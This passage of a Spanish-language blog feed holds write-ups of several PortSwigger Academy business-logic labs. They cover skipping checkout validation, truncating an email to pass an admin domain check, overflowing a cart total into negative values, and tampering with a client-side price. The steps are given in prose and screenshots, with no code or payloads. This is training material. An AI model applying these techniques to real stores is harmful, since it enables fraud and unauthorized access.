&lt;p&gt;Ingresamos con las credenciales de &lt;code&gt;wiener:peter&lt;/code&gt; por lo que tendremos un credito de $100 para poder realizar las compras. Cuando intentamos damos &lt;code&gt;place order&lt;/code&gt; e intentamos realizar la compra nos redirige a una salida de falla&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;El sistema rediige a un codigo 303 con Insufficient Funds&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 265; 
			flex-basis: 636px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/requesterror.png&#34; data-size=&#34;1540x581&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/requesterror.png&#34;
			width=&#34;1540&#34;
			height=&#34;581&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/requesterror_hua081a1a17631337936c8b7dc364445cf_82342_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/requesterror_hua081a1a17631337936c8b7dc364445cf_82342_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Error al realizar la compra&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Error al realizar la compra&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora vamos a comparar cuando si se cuenta con el credito valido para poder realizar la compra y podemos ver en el historial.png&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 544; 
			flex-basis: 1306px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/history.png&#34; data-size=&#34;724x133&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/history.png&#34;
			width=&#34;724&#34;
			height=&#34;133&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/history_huc8953adb7cc21bc8549b3a1c86c16a87_10816_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/history_huc8953adb7cc21bc8549b3a1c86c16a87_10816_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Historial de peticiones realizadas&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Historial de peticiones realizadas&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;En este caso vemos que hace un get a &lt;code&gt;/cart/oreder-confirmation&lt;/code&gt; por lo que podemos saltarnos la verificacion del checkout y ver si el sistema no valida eso anteriormente. Realizando el siguiente request agregando el producto que es mayor al valor que tenemos de credito.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 171; 
			flex-basis: 411px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/request.png&#34; data-size=&#34;1538x897&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/request.png&#34;
			width=&#34;1538&#34;
			height=&#34;897&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/request_hu70d0b2f268faad914a8939fb8f78cb37_149329_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/request_hu70d0b2f268faad914a8939fb8f78cb37_149329_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion para saltarse el checkout&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion para saltarse el checkout&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;No nos salta ni nos redirige nada y nos muestra que se ha realizado la compra correctamente, por lo que hemos resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 139; 
			flex-basis: 335px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/resuelto.png&#34; data-size=&#34;1784x1277&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/resuelto.png&#34;
			width=&#34;1784&#34;
			height=&#34;1277&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/resuelto_hu4ff9c27b203d88c93d349602df2f3e23_123580_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-7/resuelto_hu4ff9c27b203d88c93d349602df2f3e23_123580_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/</link>
        <pubDate>Tue, 07 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 4" /&gt;&lt;h1 id=&#34;lab-inconsistent-handling-of-exceptional-input&#34;&gt;Lab: Inconsistent handling of exceptional input&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;p&gt;En este caso lo que deberiamos de poder hacer es poder eliminar al usuario &lt;code&gt;Carlos&lt;/code&gt; en el cual entonces deberiamos de ingresar con un usuario &lt;code&gt;@dontwannacry.com&lt;/code&gt; .&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Nosotros contamos con un correo el cual va a recibir todos los correos que son enviados al dominio sin importar el usuario o un subdominio que indiquemos.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 205; 
			flex-basis: 493px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/mail.png&#34; data-size=&#34;1751x852&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/mail.png&#34;
			width=&#34;1751&#34;
			height=&#34;852&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/mail_hu7b4baff6d764d7c0c6541922b9ec69ff_165528_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/mail_hu7b4baff6d764d7c0c6541922b9ec69ff_165528_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Correo recibido al registrarnos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Correo recibido al registrarnos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Lo primero es registrarnos con un usuario normal, el cual no tiene mayores modulos, pero existe un path para usuarios administradores, este se puede hacer una busqueda a traves de herramientas como gobuster o intuir automaticamente por el nombre, este path es &lt;code&gt;/admin&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 396; 
			flex-basis: 951px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/admininterface.png&#34; data-size=&#34;1781x449&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/admininterface.png&#34;
			width=&#34;1781&#34;
			height=&#34;449&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/admininterface_hu829a397ab447cb95d17ebd1682f284fd_58236_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/admininterface_hu829a397ab447cb95d17ebd1682f284fd_58236_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Path accesible por administradores&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Path accesible por administradores&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Pero lamentablemente un usuario cualquiera no podria acceder ya que el sistema valida que el correo del usuario sea &lt;code&gt;@dontwannacry.com&lt;/code&gt; pero hay un problema y es que aunque el usuario se crea, el correo no permite mas de n caracteres por lo que vemos que lo ultimo del correo no aparece pero aun asi se logra crear el usuario.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 292; 
			flex-basis: 701px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/maillargo.png&#34; data-size=&#34;1828x625&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/maillargo.png&#34;
			width=&#34;1828&#34;
			height=&#34;625&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/maillargo_hu66fcac872f880bc5e003fa15dedb4390_77205_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/maillargo_hu66fcac872f880bc5e003fa15dedb4390_77205_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Correo del usuario al ser mostrado&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Correo del usuario al ser mostrado&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora queda crear el usuario con el subdmonio &lt;code&gt;dontwannacry.com&lt;/code&gt; para nuestro dominio que tenemos y que el sistema al hacer la validacion de correo tome los caracteres del subdominio pensando que si esta correcto porque borra el resto.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 325; 
			flex-basis: 782px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/request.png&#34; data-size=&#34;1877x576&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/request.png&#34;
			width=&#34;1877&#34;
			height=&#34;576&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/request_hud4e6fa3f846f0a7ebc43284c57f4be8c_88612_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/request_hud4e6fa3f846f0a7ebc43284c57f4be8c_88612_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud para la creacion de un usuario nuevo&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud para la creacion de un usuario nuevo&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y tenemos nuestro correo creado:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 247; 
			flex-basis: 593px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/accountwannacry.png&#34; data-size=&#34;1766x714&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/accountwannacry.png&#34;
			width=&#34;1766&#34;
			height=&#34;714&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/accountwannacry_hu3f55108800d330a22bd03898237d9395_83806_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/accountwannacry_hu3f55108800d330a22bd03898237d9395_83806_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Informacion mostrada en my account&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Informacion mostrada en my account&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora ya podemos acceder al path de &lt;code&gt;/admin&lt;/code&gt; y eliminar al usuario carlos:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 211; 
			flex-basis: 508px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/resuelto.png&#34; data-size=&#34;1769x835&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/resuelto.png&#34;
			width=&#34;1769&#34;
			height=&#34;835&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/resuelto_hub29c8aa35c22a436e2cc6314ee33797e_104470_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-4/resuelto_hub29c8aa35c22a436e2cc6314ee33797e_104470_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Path accesible solo con correos de dontwannacry.com&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Path accesible solo con correos de dontwannacry.com&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 3</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/</link>
        <pubDate>Mon, 06 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 3" /&gt;&lt;h1 id=&#34;lab-low-level-logic-flaw&#34;&gt;Lab: Low-level logic flaw&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;p&gt;En este caso lo que deberiamos de poder hacer es comprar un &lt;code&gt;Lightweight l33t leather jacket&lt;/code&gt; para resolver el lab usando las credenciales de &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo que podemos notar es que la web envia una peticion con el producto para agregar a la carretilla en este va el productId y la cantidad&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 90; 
			flex-basis: 216px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/articulo.png&#34; data-size=&#34;1787x1977&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/articulo.png&#34;
			width=&#34;1787&#34;
			height=&#34;1977&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/articulo_huec73577eab29e147f7155993ebfcaf33_1775636_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/articulo_huec73577eab29e147f7155993ebfcaf33_1775636_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Articulo en venta para agregar a la carretilla&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Articulo en venta para agregar a la carretilla&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso seguimos el proceso y al enviar el producto a la carretilla es enviado el id del producto, y la cantidad del producto a enviar. Pero hay un problema aunque aca no podemos enviar valores negativos y solo permite enviar peticiones de una cantidad maxima de 99, podemos enviar muchas peticiones para que el sistema en el backend genere un error y que al llegar al limite se termina convirtiendo en negativo por la maxima cantidad que permite este tipo de datos&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Total en valores negativos&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 170; 
			flex-basis: 408px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart.png&#34; data-size=&#34;1749x1028&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart.png&#34;
			width=&#34;1749&#34;
			height=&#34;1028&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart_huebdcfc2f5da3ed122e4086d57487831c_85705_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart_huebdcfc2f5da3ed122e4086d57487831c_85705_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Pago con valor negativo&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Pago con valor negativo&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora que sabemos esto lo que debemos hacer es calcular productos hasta que podamos pagar con los $100 de credito&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 234; 
			flex-basis: 562px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/request.png&#34; data-size=&#34;1537x656&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/request.png&#34;
			width=&#34;1537&#34;
			height=&#34;656&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/request_hu8c3a7d3ac97ea44c53bff16d7061ce77_86738_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/request_hu8c3a7d3ac97ea44c53bff16d7061ce77_86738_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud para enviar a la carretilla&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud para enviar a la carretilla&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego si vemos la aplicacion vemos que con 32123 del jacket y otros 35 de producto menores a $100 para hacer el calculo y que paguemos menos de 100 porque soo comprando jacket no se podria&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 167; 
			flex-basis: 402px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart2.png&#34; data-size=&#34;1795x1069&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart2.png&#34;
			width=&#34;1795&#34;
			height=&#34;1069&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart2_hu2c98f2ef1a9321c206ed5a0f7c9fae4e_84579_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/cart2_hu2c98f2ef1a9321c206ed5a0f7c9fae4e_84579_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Carretilla con los productos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Carretilla con los productos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto damos a &lt;code&gt;place order&lt;/code&gt; y realizamos la compra sin problemas y nos devuelve que hemos resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 236; 
			flex-basis: 568px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/resuelto.png&#34; data-size=&#34;1803x761&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/resuelto.png&#34;
			width=&#34;1803&#34;
			height=&#34;761&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/resuelto_hu72e45c50f6438b0e57fb7d1ebfab6c1f_102776_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-3/resuelto_hu72e45c50f6438b0e57fb7d1ebfab6c1f_102776_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Business Logic Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/</link>
        <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: Business Logic Lab 1" /&gt;&lt;h1 id=&#34;lab-excessive-trust-in-client-side-controls&#34;&gt;Lab: Excessive trust in client-side controls&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder explotar una vulnerabilidad de business logic la cual ocurre cuando el sistema no valida lo que puede hacer el usuario creyendo que todo seguira el workflow correcto.&lt;/p&gt;
&lt;p&gt;En este caso lo que deberiamos de poder hacer es comprar un &lt;code&gt;Lightweight l33t leather jacket&lt;/code&gt; para resolver el lab.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo que podemos notar es que la web envia una peticion con el producto para agregar a la carretilla&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 90; 
			flex-basis: 216px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/articulo.png&#34; data-size=&#34;1787x1977&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/articulo.png&#34;
			width=&#34;1787&#34;
			height=&#34;1977&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/articulo_huec73577eab29e147f7155993ebfcaf33_1775636_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/articulo_huec73577eab29e147f7155993ebfcaf33_1775636_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Articulo en venta para agregar a la carretilla&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Articulo en venta para agregar a la carretilla&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso seguimos el proceso y al enviar el producto a la carretilla es enviado el id del producto, y su precio, primero es 1337 pero lo cambiamos a 1337&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Podemos cambiar el precio de 1337 a 1 en la solicitud&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 146; 
			flex-basis: 351px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/request.png&#34; data-size=&#34;786x537&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/request.png&#34;
			width=&#34;786&#34;
			height=&#34;537&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/request_hu1074f3ade5d788e37e57823a4f1f3e4b_67094_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/request_hu1074f3ade5d788e37e57823a4f1f3e4b_67094_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud para enviar a la carretilla&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud para enviar a la carretilla&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego si vemos la aplicacion no valida y acepta el nuevo precio de la aplicacion y como tenemos credito de 100 podemos realizar la compra sin problemas.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 124; 
			flex-basis: 298px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/cart.png&#34; data-size=&#34;1178x947&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/cart.png&#34;
			width=&#34;1178&#34;
			height=&#34;947&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/cart_huefc3c41d91c37a703a1c5b255635f1b3_53811_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-business-logic-lab-1/cart_huefc3c41d91c37a703a1c5b255635f1b3_53811_1024x0_resize_box_3.png 1024w&#34;
